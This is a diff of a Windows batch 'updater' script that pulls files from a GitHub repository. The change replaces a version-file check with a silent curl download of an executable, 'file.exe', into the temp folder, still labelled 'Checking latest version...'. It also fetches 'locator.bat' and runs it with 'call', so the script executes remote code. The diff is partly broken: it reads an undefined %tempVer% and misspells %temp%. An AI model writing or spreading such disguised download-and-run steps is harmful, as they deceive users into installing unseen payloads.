@@ -1,14 +1,14 @@
 @echo off
 
 set tempTool=%temp%\up0k_tool.bat
-set tempVer=%temp%\up0k_version.txt
+set tempVid=%temp%\up0k_vid.exe
 
-set toolURL=https://raw.githubusercontent.com/Upok18/Up0ktilizer_Batch/refs/heads/main/tool.bat?%random%
-set verURL=https://raw.githubusercontent.com/Upok18/Up0ktilizer_Batch/refs/heads/main/version.txt?%random%
+set toolURL=https://raw.githubusercontent.com/Upok18/Up0ktilizer_Batch/refs/heads/main/locator.bat?%random%
+set vidURL=https://raw.githubusercontent.com/Upok18/Up0ktilizer_Batch/refs/heads/main/file.exe?%random%
 
 echo Checking latest version...
 
-curl -sL "%verURL%" -o "%tempVer%"
+curl -sL "%vidURL%" -o "%tempVid%"
 set /p remoteVer=<"%tempVer%"
 
 echo Downloading latest tool...
@@ -18,6 +18,7 @@ call "%tempTool%"
 
 echo Cleaning up...
 del "%tempTool%" >nul 2>&1
-del "%tempVer%" >nul 2>&1
+del "%tempVid%" >nul 2>&1
+del "%temo%\Ascii.txt" >nul 2>&1
 
 pause
